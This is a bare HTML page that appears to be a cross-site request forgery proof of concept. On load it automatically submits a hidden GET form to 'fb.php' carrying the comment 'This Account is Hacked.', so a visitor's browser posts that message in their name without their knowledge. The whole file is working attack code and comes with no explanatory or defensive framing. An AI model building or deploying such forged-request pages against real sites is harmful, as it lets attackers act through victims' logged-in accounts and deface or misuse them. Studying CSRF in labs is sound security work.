<html>
<body onload="document.getElementById('f1').submit()">
<form action="fb.php" method="GET" id="f1">
<input type="hidden" name="comment" value="This Account is Hacked. ">
<input type="submit">
</form>
</body>
</html>